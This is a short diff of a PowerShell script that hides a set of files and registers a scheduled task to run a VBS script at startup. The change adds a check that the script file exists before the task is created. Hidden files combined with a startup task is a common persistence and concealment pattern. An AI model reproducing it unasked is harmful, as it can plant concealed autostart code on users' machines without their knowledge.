@@ -37,6 +37,12 @@ foreach ($file in $filesToHide) {
     attrib +H $file
 }
 
+# Verify if the script file exists before registering the task
+if (-not (Test-Path $scriptVbsPath)) {
+    Write-Output "Script file not found: $scriptVbsPath"
+    exit
+}
+
 # Create a scheduled task
 $action = New-ScheduledTaskAction -Execute $scriptVbsPath
 $trigger = New-ScheduledTaskTrigger -AtStartup
@@ -60,4 +66,3 @@ try {
 } catch {
     Write-Output "Failed to register or start the scheduled task: $_"
 }
-
